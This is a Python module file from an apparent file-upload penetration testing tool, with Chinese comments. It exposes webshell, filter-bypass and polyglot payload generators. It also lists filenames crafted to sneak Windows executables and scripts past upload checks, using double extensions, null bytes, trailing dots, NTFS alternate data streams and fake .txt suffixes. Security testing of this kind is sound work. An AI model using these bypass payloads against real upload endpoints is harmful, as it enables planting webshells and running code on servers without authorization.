#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Payloads 模块 - 文件上传测试载荷
"""

from .webshells import WebShellGenerator
from .bypass_payloads import BypassPayloadGenerator
from .polyglots import PolyglotGenerator

__all__ = [
    'WebShellGenerator',
    'BypassPayloadGenerator', 
    'PolyglotGenerator',
]

def get_available_payloads():
    """获取所有可用的payload类型"""
    bypass_gen = BypassPayloadGenerator()
    return {
        'webshells': list(WebShellGenerator.WEBSHELL_TEMPLATES.keys()),
        'bypass_techniques': list(bypass_gen.techniques.keys()),
        'polyglots': list(PolyglotGenerator.POLYGLOT_TEMPLATES.keys()),
    }

def get_exe_payloads():
    """【新增】获取Windows可执行文件上传payload"""
    bypass_gen = BypassPayloadGenerator()
    exe_payloads = []
    
    # Windows可执行文件扩展名
    exe_exts = ['exe', 'scr', 'pif', 'com', 'dll', 'msi']
    for ext in exe_exts:
        exe_payloads.append(f"shell.{ext}")
        exe_payloads.append(f"shell.{ext}.jpg")  # 双扩展名
        exe_payloads.append(f"shell.{ext}%00.jpg")  # 空字节
        exe_payloads.append(f"shell.{ext}.")  # 尾部点号
        exe_payloads.append(f"shell.{ext}::$DATA")  # ADS
    
    # Windows脚本文件
    script_exts = ['bat', 'cmd', 'ps1', 'vbs', 'js', 'hta', 'wsf']
    for ext in script_exts:
        exe_payloads.append(f"shell.{ext}")
        exe_payloads.append(f"shell.{ext}.txt")  # 伪装文本
    
    return exe_payloads

def get_payload_count():
    """获取payload数量统计"""
    bypass_gen = BypassPayloadGenerator()
    return {
        'webshell_templates': len(WebShellGenerator.WEBSHELL_TEMPLATES),
        'bypass_techniques': len(bypass_gen.techniques),
        'polyglot_types': len(PolyglotGenerator.POLYGLOT_TEMPLATES),
        'exe_variants': len(get_exe_payloads()),
    }
